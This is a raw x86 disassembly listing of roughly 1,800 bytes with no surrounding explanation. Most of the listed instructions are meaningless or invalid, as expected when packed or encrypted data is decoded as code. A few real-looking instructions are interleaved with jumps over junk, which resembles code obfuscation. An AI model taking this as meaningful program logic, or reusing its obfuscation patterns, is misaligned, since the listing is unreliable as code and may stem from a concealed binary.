  40c848:	xor    edx,DWORD PTR [ebx-0x2eab13c7]
  40c84e:	mov    ecx,0xffa451d3
  40c853:	dec    esi
  40c854:	push   ebx
  40c855:	ss jbe 0x40c8a3
  40c858:	xor    BYTE PTR [eax],cl
  40c85a:	adc    al,0x0
  40c85c:	int3   
  40c85d:	stc    
  40c85e:	(bad)  
  40c860:	mov    WORD PTR [edx+0x304333cd],ss
  40c866:	(bad)  
  40c867:	mov    al,0x22
  40c869:	inc    ebx
  40c86a:	jecxz  0x40c85f
  40c86c:	jbe    0x40c813
  40c86e:	jp     0x40c851
  40c870:	cmp    BYTE PTR [ebx-0x3b9cea98],ch
  40c876:	jmp    0xd775:0xb6a24fd3
  40c87d:	popf   
  40c87e:	fiadd  WORD PTR [ebp+edx*8-0x5d07c1ab]
  40c885:	in     al,dx
  40c886:	cmp    BYTE PTR [ecx],ch
  40c888:	mov    ch,0xee
  40c88a:	repnz mov edx,ecx
  40c88d:	add    DWORD PTR [edx-0x7b],ecx
  40c890:	push   edx
  40c891:	cdq    
  40c892:	push   ebx
  40c893:	fstp   TBYTE PTR [ebx-0x3fb66666]
  40c899:	cmp    eax,edi
  40c89b:	pop    eax
  40c89c:	jle    0x40c852
  40c89e:	adc    eax,0x5bf69c00
  40c8a3:	xchg   ebx,eax
  40c8a4:	imul   esi,DWORD PTR [si+0x57],0xcd79a278
  40c8ac:	test   eax,0xfc83b1e
  40c8b1:	xchg   BYTE PTR [esi-0x1600000c],bl
  40c8b7:	mov    ebp,0xe7000000
  40c8bc:	sbb    dh,BYTE PTR [edx+0x45]
  40c8bf:	jmp    FWORD PTR [ebp-0x9]
  40c8c2:	mov    edx,0xa18e9cc5
  40c8c7:	mov    esi,0x21e46f52
  40c8cc:	test   BYTE PTR [eax],al
  40c8ce:	add    BYTE PTR [ebp+0x39000000],ah
  40c8d4:	pop    ds
  40c8d5:	out    0xcb,al
  40c8d7:	adc    ch,BYTE PTR [ebx]
  40c8d9:	mov    bl,0x86
  40c8db:	adc    dh,ah
  40c8dd:	mov    edx,esi
  40c8df:	aaa    
  40c8e0:	xor    esp,DWORD PTR [edi-0x40848e48]
  40c8e6:	nop
  40c8e7:	test   eax,0x3af0f927
  40c8ec:	stos   WORD PTR es:[edi],ax
  40c8ee:	cwde   
  40c8ef:	neg    ebp
  40c8f1:	stos   DWORD PTR es:[edi],eax
  40c8f2:	jae    0x40c8b8
  40c8f4:	imul   DWORD PTR [edx]
  40c8f6:	xchg   BYTE PTR [esi+0x2],al
  40c8f9:	xor    DWORD PTR [esi-0x58],esp
  40c8fc:	push   edi
  40c8fd:	adc    eax,0xad5da78d
  40c902:	adc    bh,0x93
  40c905:	lods   eax,DWORD PTR ds:[esi]
  40c906:	pop    ecx
  40c907:	xchg   esp,eax
  40c908:	popa   
  40c909:	outs   dx,DWORD PTR ds:[esi]
  40c90a:	dec    ebp
  40c90b:	pop    ecx
  40c90c:	mov    ebp,0xf3a15863
  40c911:	daa    
  40c912:	sbb    esi,edi
  40c914:	jmp    0x40c915
  40c916:	mov    bh,0x36
  40c918:	xor    ah,BYTE PTR [edx]
  40c91a:	mov    dh,0x3e
  40c91c:	jmp    0xf564:0x81b5e517
  40c923:	ss call 0x8514663e
  40c929:	stos   DWORD PTR es:[edi],eax
  40c92a:	dec    esi
  40c92b:	push   cs
  40c92c:	in     al,0xd4
  40c92e:	dec    esi
  40c92f:	inc    edx
  40c930:	fisub  DWORD PTR [eax]
  40c932:	leave  
  40c933:	dec    ecx
  40c934:	repz adc eax,0xfb0009d
  40c93a:	stos   BYTE PTR es:[edi],al
  40c93b:	mov    bh,0x98
  40c93d:	sbb    al,0x45
  40c93f:	cmp    ecx,esp
  40c941:	les    edx,FWORD PTR [ecx+eax*2-0x5a]
  40c945:	sbb    eax,0x9a4cf677
  40c94a:	cwde   
  40c94b:	into   
  40c94c:	hlt    
  40c94d:	adc    eax,0x8f2326a8
  40c952:	jns    0x40c9a1
  40c954:	push   esp
  40c955:	imul   DWORD PTR [ecx+0x3]
  40c958:	aad    0x51
  40c95a:	mov    edx,DWORD PTR [ebx]
  40c95c:	mov    bh,0xc2
  40c95e:	popf   
  40c95f:	inc    ebx
  40c960:	inc    ecx
  40c961:	push   cs
  40c962:	mov    ebp,0xeff7b991
  40c967:	std    
  40c968:	je     0x40c94a
  40c96a:	cmp    DWORD PTR [ebp-0x21db838a],0x4f974f6
  40c974:	jmp    0x40c906
  40c976:	int    0x4a
  40c978:	mov    DWORD PTR [ebp-0x34],0x7ce3
  40c97f:	mov    DWORD PTR [ebp+0xc],0x1b50
  40c986:	mov    DWORD PTR [ebp+0x8],0x3d30
  40c98d:	mov    DWORD PTR [ebp-0x24],0x7e21
  40c994:	mov    DWORD PTR [ebp-0x28],0x6861
  40c99b:	mov    DWORD PTR [ebp-0x2c],0x446c
  40c9a2:	jmp    0x40ca64
  40c9a7:	jg     0x40ca03
  40c9a9:	int    0xe4
  40c9ab:	in     eax,dx
  40c9ac:	idiv   DWORD PTR [edi-0x25]
  40c9af:	aas    
  40c9b0:	movd   mm5,DWORD PTR [esi+0x22]
  40c9b4:	scas   eax,DWORD PTR es:[edi]
  40c9b5:	int    0xde
  40c9b7:	mov    BYTE PTR [eax+eax*1+0xa500],0x0
  40c9bf:	out    dx,eax
  40c9c0:	dec    ebx
  40c9c1:	pushf  
  40c9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c3:	out    dx,al
  40c9c4:	push   0x4c6d45a4
  40c9c9:	hlt    
  40c9ca:	sub    dh,BYTE PTR [edx-0x5e]
  40c9cd:	inc    ebx
  40c9ce:	jne    0x40c9f3
  40c9d0:	out    dx,eax
  40c9d1:	cmp    esi,DWORD PTR [ebx+0x2f]
  40c9d4:	hlt    
  40c9d5:	retf   
  40c9d6:	jmp    0x40ca21
  40c9d8:	scas   eax,DWORD PTR es:[edi]
  40c9d9:	cmp    al,0x9
  40c9db:	aam    0xf
  40c9dd:	outs   dx,DWORD PTR ds:[esi]
  40c9de:	push   ecx
  40c9df:	mov    edx,0xc345c21
  40c9e4:	in     al,0x46
  40c9e6:	leave  
  40c9e7:	cmp    ah,0xc3
  40c9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9eb:	jmp    0xaf2b:0x99f7f93
  40c9f2:	imul   eax,DWORD PTR [edi+0x18],0x47
  40c9f6:	(bad)  
  40c9f7:	in     eax,dx
  40c9f8:	dec    esi
  40c9f9:	fs pop edi
  40c9fb:	sahf   
  40c9fc:	adc    eax,0xea3d636b
  40ca01:	out    dx,al
  40ca02:	jnp    0x40ca5a
  40ca04:	daa    
  40ca05:	sbb    DWORD PTR [edx],esi
  40ca07:	sbb    ch,bh
  40ca09:	push   ecx
  40ca0a:	cmp    eax,0x35463265
  40ca0f:	lea    ecx,[edx]
  40ca11:	clc    
  40ca12:	push   ecx
  40ca13:	into   
  40ca14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca15:	cmp    al,0xfc
  40ca17:	test   al,0x53
  40ca19:	mov    bh,0xcd
  40ca1b:	mov    edi,0xcfe309c3
  40ca20:	add    DWORD PTR [edi+0x37],ebx
  40ca23:	ds (bad) 
  40ca25:	xor    edx,eax
  40ca27:	jns    0x40ca63
  40ca29:	(bad)  
  40ca2a:	jmp    0x40ca09
  40ca2c:	mov    DWORD PTR [eax-0x27d41339],eax
  40ca32:	push   eax
  40ca33:	jb     0x40caa0
  40ca35:	adc    edi,DWORD PTR [esi]
  40ca37:	addr16 ja 0x40ca3e
  40ca3a:	inc    eax
  40ca3b:	push   es
  40ca3c:	xor    eax,0x34d7ed37
  40ca41:	(bad)  
  40ca42:	scas   eax,DWORD PTR es:[edi]
  40ca43:	gs mov dx,0xdec2
  40ca48:	outs   dx,DWORD PTR ds:[esi]
  40ca49:	arpl   WORD PTR [esi-0x6e],ax
  40ca4c:	retf   0x424a
  40ca4f:	xchg   ebx,eax
  40ca50:	pop    esp
  40ca51:	imul   DWORD PTR [ecx-0x40]
  40ca54:	fs inc ecx
  40ca56:	out    dx,al
  40ca57:	repnz addr16 push ebx
  40ca5a:	mov    DWORD PTR [edi],edi
  40ca5c:	push   esi
  40ca5d:	shl    ebx,1
  40ca5f:	imul   BYTE PTR [edi-0x74312484]
  40ca65:	inc    ebp
  40ca66:	or     BYTE PTR [ebx-0x6ecaf3b3],cl
  40ca6c:	sub    DWORD PTR [eax],eax
  40ca6e:	add    BYTE PTR [edi],cl
  40ca70:	scas   eax,DWORD PTR es:[edi]
  40ca71:	shr    ecx,0xbd
  40ca74:	add    BYTE PTR [eax],al
  40ca76:	add    BYTE PTR [ebx-0x7c],ah
  40ca79:	rcr    DWORD PTR [ecx-0x1942209],1
  40ca7f:	xchg   ebp,eax
  40ca80:	ins    BYTE PTR es:[edi],dx
  40ca81:	push   eax
  40ca82:	jo     0x40ca80
  40ca84:	push   esi
  40ca85:	sub    al,bl
  40ca87:	imul   eax,DWORD PTR [ebp+0xa50000],0x0
  40ca8e:	add    BYTE PTR [edx],bl
  40ca90:	add    BYTE PTR [edx+0x12],bh
  40ca93:	xchg   ecx,eax
  40ca94:	loope  0x40ca75
  40ca96:	adc    al,0x55
  40ca98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca99:	fiadd  DWORD PTR [edi+eiz*4+0x10]
  40ca9d:	shl    esi,cl
  40ca9f:	xchg   edx,eax
  40caa0:	lock xor DWORD PTR [edx],0xfffffffe
  40caa4:	cmp    al,0x8c
  40caa6:	(bad)  
  40caa7:	stc    
  40caa8:	int    0x81
  40caaa:	xchg   esi,eax
  40caab:	sti    
  40caac:	xor    al,0x70
  40caae:	push   0xd9bd07e1
  40cab3:	xor    BYTE PTR [edx],al
  40cab5:	jecxz  0x40ca4b
  40cab7:	hlt    
  40cab8:	mov    ah,BYTE PTR [ecx]
  40caba:	or     BYTE PTR [ebx+0x39],0xf
  40cabe:	inc    ebp
  40cabf:	xchg   bh,ah
  40cac1:	call   FWORD PTR [ecx-0xd]
  40cac4:	ret    
  40cac5:	pop    esp
  40cac6:	sbb    bh,BYTE PTR [edx+0x104e2e20]
  40cacc:	xchg   dl,dh
  40cace:	(bad)  
  40cacf:	aas    
  40cad0:	pop    es
  40cad1:	mov    dh,0xc4
  40cad3:	xchg   esp,eax
  40cad4:	push   ebp
  40cad5:	mov    ecx,eax
  40cad7:	fs clc 
  40cad9:	mov    bh,0xec
  40cadb:	xor    eax,0x56284f36
  40cae0:	push   esp
  40cae1:	cwde   
  40cae2:	inc    esi
  40cae3:	mov    ecx,0xa6f561c3
  40cae8:	jge    0x40ca9f
  40caea:	sbb    esi,DWORD PTR [eax-0x83481c6]
  40caf0:	sbb    al,0x63
  40caf2:	mov    gs,WORD PTR [esi]
  40caf4:	pop    eax
  40caf5:	sbb    BYTE PTR [ebp-0x27],al
  40caf8:	dec    esi
  40caf9:	and    BYTE PTR [esi+0x3b879a3f],dh
  40caff:	push   ebx
  40cb00:	jmp    0x40cb3f
  40cb02:	cdq    
  40cb03:	xchg   DWORD PTR [ebx-0x48],ebp
  40cb06:	clc    
  40cb07:	cdq    
  40cb08:	popa   
  40cb09:	sub    dh,BYTE PTR [ecx-0x5d]
  40cb0c:	jb     0x40caec
  40cb0e:	div    DWORD PTR [ecx]
  40cb10:	mov    eax,ds:0x60e3449e
  40cb15:	add    DWORD PTR gs:[edi+ecx*8-0x78],edi
  40cb1a:	sbb    DWORD PTR [ebx+0x3c4736ec],esi
  40cb20:	dec    ebx
  40cb21:	ror    DWORD PTR [eax+0x6a],cl
  40cb24:	loop   0x40cb77
  40cb26:	sar    cl,0x4e
  40cb29:	xchg   ecx,eax
  40cb2a:	mov    ecx,0x14a3ce08
  40cb2f:	scas   eax,DWORD PTR es:[edi]
  40cb30:	scas   al,BYTE PTR es:[edi]
  40cb31:	mov    edx,0x4d8bf1ff
  40cb36:	int3   
  40cb37:	jmp    0x40cbf9
  40cb3c:	xchg   esi,eax
  40cb3d:	test   eax,0xd77f4778
  40cb42:	mov    edi,0xd0690af9
  40cb47:	add    dh,dl
  40cb49:	stc    
  40cb4a:	ror    BYTE PTR [esi+0x10],cl
  40cb4d:	xchg   BYTE PTR [eax],al
  40cb4f:	add    BYTE PTR [ebp-0x1a000000],ah
  40cb55:	stc    
  40cb56:	icebp  
  40cb57:	inc    edi
  40cb58:	fdivr  DWORD PTR [ecx-0x5c]
  40cb5b:	inc    edi
  40cb5c:	cld    
  40cb5d:	inc    ebx
  40cb5e:	mov    ebp,DWORD PTR [eax+0x165373a]
  40cb64:	int3   
  40cb65:	pop    esi
  40cb66:	popf   
  40cb67:	std    
  40cb68:	hlt    
  40cb69:	push   cs
  40cb6a:	push   eax
  40cb6b:	popf   
  40cb6c:	sub    esi,DWORD PTR [ecx-0x337bb7ae]
  40cb72:	stc    
  40cb73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb74:	shr    DWORD PTR [edi],0x8
  40cb77:	sbb    ch,BYTE PTR [eax-0x21c95318]
  40cb7d:	mov    al,ds:0x4e96bfb6
  40cb82:	mov    bl,0x83
  40cb84:	iret   
  40cb85:	lods   eax,DWORD PTR ds:[esi]
  40cb86:	and    bh,BYTE PTR [edx]
  40cb88:	dec    esp
  40cb89:	cdq    
  40cb8a:	xor    ch,al
  40cb8c:	push   edi
  40cb8d:	cwde   
  40cb8e:	loop   0x40cbb4
  40cb90:	adc    BYTE PTR [ecx],bl
  40cb92:	stos   DWORD PTR es:[edi],eax
  40cb93:	jecxz  0x40cb77
  40cb95:	mov    WORD PTR [ebx+0x37],ds
  40cb98:	fstp   QWORD PTR [ecx+0x19ccf485]
  40cb9e:	push   0x5
  40cba0:	loope  0x40cb5c
  40cba2:	mov    edi,0xe08b677b
  40cba7:	test   al,0x77
  40cba9:	call   0x9513:0x1a0dc254
  40cbb0:	sbb    al,0xcf
  40cbb2:	lahf   
  40cbb3:	cli    
  40cbb4:	jl     0x40cc21
  40cbb6:	outs   dx,DWORD PTR ds:[esi]
  40cbb7:	sar    cl,0xa6
  40cbba:	out    dx,eax
  40cbbb:	push   ecx
  40cbbc:	adc    esp,DWORD PTR [esi-0x41]
  40cbbf:	mov    edi,0xd9d85c67
  40cbc4:	addr16 xchg ebp,eax
  40cbc6:	xchg   ecx,eax
  40cbc7:	not    al
  40cbc9:	mov    al,ds:0x5f8cecf
  40cbce:	jge    0x40cc1c
  40cbd0:	or     BYTE PTR [edi+0xe],ah
  40cbd3:	pusha  
  40cbd4:	(bad)  
  40cbd5:	push   esi
  40cbd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbd7:	pop    ebx
  40cbd8:	jle    0x40cc49
  40cbda:	(bad)  
  40cbdb:	add    BYTE PTR [ebx],0x53
  40cbde:	ins    BYTE PTR es:[edi],dx
  40cbdf:	cmp    BYTE PTR [esi+0x62],ch
  40cbe2:	jge    0x40cb6b
  40cbe4:	xchg   ebp,eax
  40cbe5:	rol    BYTE PTR [ebx+ebx*1-0xa],0x9f
  40cbea:	mov    dh,0xe5
  40cbec:	or     DWORD PTR ds:0x7eb645b,eax
  40cbf2:	ficom  WORD PTR [ebx+0x6ea348bc]
  40cbf8:	or     BYTE PTR [ebx],0xc1
  40cbfb:	or     eax,0x6063
  40cc00:	jmp    0x40ccc2
  40cc05:	jecxz  0x40cb8f
  40cc07:	mov    eax,ds:0xf73deb34
  40cc0c:	fcomip st,st(6)
  40cc0e:	and    BYTE PTR [edi-0x33],0x78
  40cc12:	stos   BYTE PTR es:[edi],al
  40cc13:	push   edi
  40cc14:	pop    edi
  40cc15:	mov    ch,0x86
  40cc17:	add    BYTE PTR [eax],al
  40cc19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc1a:	add    BYTE PTR [eax],al
  40cc1c:	add    BYTE PTR [eax-0x3b56fea7],ah
  40cc22:	ds test eax,0xda1ff3db
  40cc28:	xor    al,0x90
  40cc2a:	ror    DWORD PTR [ebx+edi*4+0x5f],1
  40cc2e:	or     cl,bh
  40cc30:	fwait
  40cc31:	hlt    
  40cc32:	lds    ebp,FWORD PTR [edx-0x2]
  40cc35:	out    dx,al
  40cc36:	mov    BYTE PTR [eax+0x65094db],bl
  40cc3c:	mov    eax,0xabda69f1
  40cc41:	push   esi
  40cc42:	enter  0x86eb,0x21
  40cc46:	imul   ecx,DWORD PTR [ecx+0x77],0x73
  40cc4a:	jmp    0x45ab:0x4ab4850b
  40cc51:	sti    
  40cc52:	idiv   eax
  40cc54:	je     0x40cc55
  40cc56:	sbb    eax,0x457c8c08
  40cc5b:	(bad)  
  40cc5d:	lods   al,BYTE PTR ds:[esi]
  40cc5e:	leave  
  40cc5f:	jmp    0x40cca3
  40cc61:	pop    esp
  40cc62:	test   eax,0xad0e405
  40cc67:	push   edi
  40cc68:	cmp    BYTE PTR es:[edi+0x20],dl
  40cc6c:	xchg   ecx,eax
  40cc6d:	in     al,dx
  40cc6e:	mov    ch,0x4d
  40cc70:	mov    ecx,0xa74750aa
  40cc75:	jnp    0x40cc54
  40cc77:	sbb    esi,DWORD PTR [edi+0x4358d2b5]
  40cc7d:	in     eax,0x23
  40cc7f:	(bad)  
  40cc80:	or     ebp,DWORD PTR [esi+ebx*8+0xdc823ec]
  40cc87:	push   ebp
  40cc88:	jle    0x40cc19
  40cc8a:	mov    DWORD PTR [edx],0xcb43c4f
  40cc90:	or     BYTE PTR [eax+0x41],bh
  40cc93:	or     al,0x33
  40cc95:	not    DWORD PTR [eax-0x5f]
  40cc98:	xchg   DWORD PTR ds:0x857d2fa,edx
  40cc9e:	mov    edx,0xea16afa4
  40cca3:	(bad)  
  40cca5:	dec    ecx
  40cca6:	aas    
  40cca7:	(bad)  
  40cca8:	xchg   esp,eax
  40cca9:	jb     0x40cd1b
  40ccab:	ja     0x40cca9
  40ccad:	mov    eax,ds:0x7b8b19b2
  40ccb2:	or     DWORD PTR [edx+edi*4+0x61],esp
  40ccb6:	mov    dl,0x6e
  40ccb8:	mov    ebx,0xfb0ca78
  40ccbd:	jno    0x40ccd7
  40ccbf:	and    ebp,DWORD PTR [eax]
  40ccc1:	leave  
  40ccc2:	mov    ecx,0x233bf54
  40ccc7:	sub    ecx,eax
  40ccc9:	jmp    0x40cd8b
  40ccce:	cwde   
  40cccf:	xchg   edx,eax
  40ccd0:	jb     0x40ccfe
  40ccd2:	jp     0x40ccc0
  40ccd4:	fidiv  WORD PTR [esi+0xdd5e468]
  40ccda:	jnp    0x40cd43
  40ccdc:	out    0xa4,al
  40ccde:	pop    edx
  40ccdf:	xchg   DWORD PTR [eax],eax
  40cce1:	add    BYTE PTR [ebp+0x3d000000],ah
  40cce7:	rcr    BYTE PTR [ecx-0x34],0x86
  40cceb:	push   edi
  40ccec:	das    
  40cced:	fwait
  40ccee:	and    edx,DWORD PTR [edi-0x43]
  40ccf1:	xor    edi,eax
  40ccf3:	adc    ch,BYTE PTR [edi+0x32b03ca8]
  40ccf9:	repz enter 0x190c,0x6f
  40ccfe:	ficomp WORD PTR [edx+edx*2-0x2d24df07]
  40cd05:	sbb    dl,BYTE PTR [edx+0x5c]
  40cd08:	(bad)  
  40cd09:	int3   
  40cd0a:	fsubr  QWORD PTR [esi]
  40cd0c:	stos   DWORD PTR es:[edi],eax
  40cd0d:	fxtract 
  40cd0f:	sub    DWORD PTR [ecx-0x13f02027],edx
  40cd15:	jb     0x40ccfe
  40cd17:	outs   dx,BYTE PTR ds:[esi]
  40cd18:	mov    esp,0x8260f6f8
  40cd1d:	(bad)  
  40cd1e:	jmp    0x7d3d:0x204f39d3
  40cd25:	push   edx
  40cd26:	ins    DWORD PTR es:[edi],dx
  40cd27:	sbb    BYTE PTR [ecx-0x3f],bl
  40cd2a:	mov    BYTE PTR [ebx+0x4e46c138],ah
  40cd30:	inc    ecx
  40cd31:	xchg   esi,eax
  40cd32:	push   es
  40cd33:	mov    bl,0x5a
  40cd35:	mov    DWORD PTR [edx-0x67a01d1e],edi
  40cd3b:	mov    ecx,0xe85bbc62
  40cd40:	inc    edi
  40cd41:	adc    ch,ch
  40cd43:	fidiv  WORD PTR [ecx+0x55]
  40cd46:	dec    esp
  40cd47:	in     al,0xc7
  40cd49:	sbb    ecx,edx
  40cd4b:	push   cs
  40cd4c:	ins    DWORD PTR es:[edi],dx
  40cd4d:	inc    edi
  40cd4e:	or     ecx,DWORD PTR [ebx-0x44152af8]
  40cd54:	dec    edi
  40cd55:	jmp    0x13b7:0x2d4b6b7d
  40cd5c:	addr16 mov ecx,0xe3128d02
  40cd62:	int    0xe2
  40cd64:	xor    ch,dl
  40cd66:	or     DWORD PTR [esi],ebx
  40cd68:	mov    BYTE PTR [esi],bh
  40cd6a:	lds    edi,FWORD PTR ds:0x798bda4c
  40cd70:	pop    esp
  40cd71:	dec    ecx
  40cd72:	adc    edx,DWORD PTR [edx+0x15fe5646]
  40cd78:	xlat   BYTE PTR ds:[ebx]
  40cd79:	aas    
  40cd7a:	int3   
  40cd7b:	or     bh,BYTE PTR [esi+0x145be26c]
  40cd81:	mov    eax,0xc5994d69
  40cd86:	ret    0xe1ae
  40cd89:	adc    BYTE PTR [esi-0x39],dl
  40cd8c:	inc    ebp
  40cd8d:	or     BYTE PTR [ebp-0x38fffff3],dl
  40cd93:	inc    ebp
  40cd94:	rcl    BYTE PTR [edx-0x38ffffe4],1
  40cd9a:	inc    ebp
  40cd9b:	int3   
  40cd9c:	mov    WORD PTR [ebx+0x0],?
  40cd9f:	add    bh,al
  40cda1:	inc    ebp
  40cda2:	or     al,0xd
  40cda4:	push   es
  40cda5:	add    BYTE PTR [eax],al
  40cda7:	jmp    0x40ce69
  40cdac:	xor    al,0x15
  40cdae:	or     ch,BYTE PTR [eax-0x624940d5]
  40cdb4:	(bad)  [edi+0x304b3365]
  40cdba:	and    ebx,DWORD PTR [edi+0x87ff]
  40cdc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdc1:	add    BYTE PTR [eax],al
  40cdc3:	add    bl,ch
  40cdc5:	push   esp
  40cdc6:	jmp    0x9b67ddf1
  40cdcb:	retf   
  40cdcc:	ret    
  40cdcd:	mov    dh,0xec
  40cdcf:	fcomp  st(5)
  40cdd1:	je     0x40cd6a
  40cdd3:	in     eax,dx
  40cdd4:	jecxz  0x40cd88
  40cdd6:	ficom  WORD PTR [eax+0x4a3dd014]
  40cddc:	out    dx,al
  40cddd:	int    0x45
  40cddf:	out    dx,eax
  40cde0:	imul   esp,DWORD PTR [eax],0x3d
  40cde3:	sbb    eax,0xa14f611f
  40cde8:	and    ebp,DWORD PTR [edi-0x7ea1862a]
  40cdee:	cwde   
  40cdef:	dec    edi
  40cdf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdf1:	cmp    sp,di
  40cdf4:	call   0x3022:0xa103969b
  40cdfb:	(bad)  
  40cdfc:	loope  0x40cd92
  40cdfe:	adc    al,0xf8
  40ce00:	not    dh
  40ce02:	shl    BYTE PTR [ebx+0xe],0x47
  40ce06:	retf   
  40ce07:	push   esp
  40ce08:	out    dx,al
  40ce09:	push   esi
  40ce0a:	cmovp  edi,DWORD PTR [ecx]
  40ce0d:	add    dh,BYTE PTR [ebx-0x7a6bc7cd]
  40ce13:	or     al,0x52
  40ce15:	push   ebx
  40ce16:	push   es
  40ce17:	es jmp 0x94a5a8a4
  40ce1d:	(bad)  
  40ce1f:	cli    
  40ce20:	inc    ecx
  40ce21:	icebp  
  40ce22:	fidiv  DWORD PTR [eax]
  40ce24:	fnstcw WORD PTR [ebx]
  40ce26:	ins    DWORD PTR es:[edi],dx
  40ce27:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce29:	loopne 0x40ce64
  40ce2b:	pop    esi
  40ce2c:	push   esi
  40ce2d:	pop    esi
  40ce2e:	sub    BYTE PTR [esi+eiz*8-0x17f01a76],ch
  40ce35:	es ja  0x40cdd0
  40ce38:	in     eax,dx
  40ce39:	and    eax,0x4cccc89e
  40ce3e:	jl     0x40cdfa
  40ce40:	and    esp,DWORD PTR [eax]
  40ce42:	mov    eax,DWORD PTR [ecx]
  40ce44:	mov    esp,0xa09490c8
  40ce49:	loop   0x40cec4
  40ce4b:	test   BYTE PTR [eax],cl
  40ce4d:	ja     0x40ce5e
  40ce4f:	(bad)  
  40ce51:	inc    edi
  40ce52:	pop    ss
  40ce53:	shr    BYTE PTR [edx+0x9],0xf0
  40ce57:	iret   
  40ce58:	mov    esi,0x8d95b1f3
  40ce5d:	test   ebx,eax
  40ce5f:	mov    esp,esi
  40ce61:	cld    
  40ce62:	sub    esi,DWORD PTR [esi+0x70b511cf]
  40ce68:	pop    edi
  40ce69:	mov    eax,DWORD PTR [ebp+0x8]
  40ce6c:	xor    eax,0x3cc5
  40ce71:	add    eax,0x6a79
  40ce76:	xor    eax,0xdaa8
  40ce7b:	jmp    0x40cf3d
  40ce80:	xchg   edi,eax
  40ce81:	inc    edi
  40ce82:	or     eax,0xb77bdd39
  40ce87:	out    dx,eax
  40ce88:	int3   
  40ce89:	mov    al,0x45
  40ce8b:	in     al,0xb3
  40ce8d:	push   ebx
  40ce8e:	fiadd  WORD PTR [edx]
  40ce90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce91:	mov    BYTE PTR [eax],al
  40ce93:	add    BYTE PTR [ebp-0x3a000000],ah
  40ce99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce9a:	test   al,0xa
  40ce9c:	or     DWORD PTR [esi-0x59],edx
  40ce9f:	xor    BYTE PTR [edx+0x110832d3],0xbf
  40cea6:	xlat   BYTE PTR ds:[ebx]
  40cea7:	stos   BYTE PTR es:[edi],al
  40cea8:	(bad)  
  40cea9:	adc    BYTE PTR [esi+0x4a808455],ah
  40ceaf:	mov    ss,WORD PTR [ebx+0x9]
  40ceb2:	push   esi
  40ceb3:	retf   
  40ceb4:	pop    edx
  40ceb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceb6:	pop    edx
  40ceb7:	mov    ds,edx
  40ceb9:	in     al,0x18
  40cebb:	int3   
  40cebc:	push   0x3da820a3
  40cec1:	cmp    DWORD PTR [eax-0x718cb514],edi
  40cec7:	imul   edi,DWORD PTR [ecx-0x9],0xc886e258
  40cece:	dec    ecx
  40cecf:	out    dx,eax
  40ced0:	sub    eax,DWORD PTR [ebp+0x7b]
  40ced3:	push   0xc68df7dd
  40ced8:	inc    edx
  40ced9:	call   DWORD PTR [edi]
  40cedb:	and    BYTE PTR [edx],cl
  40cedd:	rcr    DWORD PTR [edx+0x60],cl
  40cee0:	fdiv   QWORD PTR [eax-0x26d9cd0e]
  40cee6:	stos   DWORD PTR es:[edi],eax
  40cee7:	leave  
  40cee8:	leave  
  40cee9:	dec    esp
  40ceea:	iret   
  40ceeb:	(bad)  
  40ceec:	stc    
  40ceed:	xor    esi,DWORD PTR [ecx+ebp*8+0x68]
  40cef1:	out    0x62,al
  40cef3:	push   0x3e
  40cef5:	mov    bl,0x60
  40cef7:	jmp    0x40ce8c
  40cef9:	mov    WORD PTR [edx-0x54],ds
  40cefc:	repnz dec edx
  40cefe:	jne    0x40cf21
  40cf00:	inc    esi
  40cf01:	jp     0x40cf10
  40cf03:	mov    ah,0x68
  40cf05:	sti    
  40cf06:	mov    gs,WORD PTR [ebp*8+0x35a5cc66]
  40cf0d:	inc    ebp
  40cf0e:	ret    
  40cf0f:	emms   
  40cf11:	shl    dh,0x78
  40cf14:	loopne 0x40cf5f
  40cf16:	ds dec ebp
  40cf18:	mov    dh,0x37
  40cf1a:	js     0x40cf62
  40cf1c:	push   cs
  40cf1d:	popa   
  40cf1e:	inc    ebx
  40cf1f:	cli    
  40cf20:	mov    ch,0x6d
  40cf22:	add    ch,bh
  40cf24:	outs   dx,DWORD PTR ds:[esi]
  40cf25:	inc    DWORD PTR [esi+0x2d]
  40cf28:	in     al,0x95
  40cf2a:	stos   BYTE PTR es:[edi],al
  40cf2b:	(bad)  
  40cf2c:	je     0x40cf1f
  40cf2e:	scas   eax,DWORD PTR es:[edi]
  40cf2f:	mov    ebx,0x90ec8b83
  40cf34:	(bad)  
  40cf35:	int3   
  40cf36:	or     esi,DWORD PTR [ecx+eiz*4+0x36b712cd]
  40cf3d:	mov    edx,ecx
  40cf3f:	sub    edx,eax
  40cf41:	jmp    0x40d003
  40cf46:	mov    ah,0x5d
  40cf48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf49:	or     al,0xef
  40cf4b:	(bad)  
  40cf4c:	mov    esi,0x9cf67cfd
  40cf51:	fidiv  WORD PTR [eax-0x40]
  40cf54:	fistp  DWORD PTR [edi+0x8949]
  40cf5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf5b:	add    BYTE PTR [eax],al
  40cf5d:	add    BYTE PTR [esi-0x48038550],ch
  40cf63:	xchg   ebp,eax
  40cf64:	fisttp DWORD PTR [ecx]
  40cf66:	sub    edx,DWORD PTR [ebp+0xf39de04]
  40cf6c:	fs push edi
  40cf6e:	push   ss
  40cf6f:	cmp    eax,0xb93616bb
  40cf74:	pusha  
  40cf75:	add    BYTE PTR [edx+0x35f0298b],0xca
  40cf7c:	inc    eax
  40cf7d:	sub    bh,BYTE PTR [esi+0xd]
  40cf80:	xlat   BYTE PTR ds:[ebx]
  40cf81:	or     edi,DWORD PTR [edx+0x383b65a0]
  40cf87:	add    cl,dh
  40cf89:	xchg   ebx,eax
  40cf8a:	xor    al,0x2e
  40cf8c:	bound  ecx,QWORD PTR [ecx+0x442ec240]
  40cf92:	enter  0x436,0x65
  40cf96:	inc    ebp
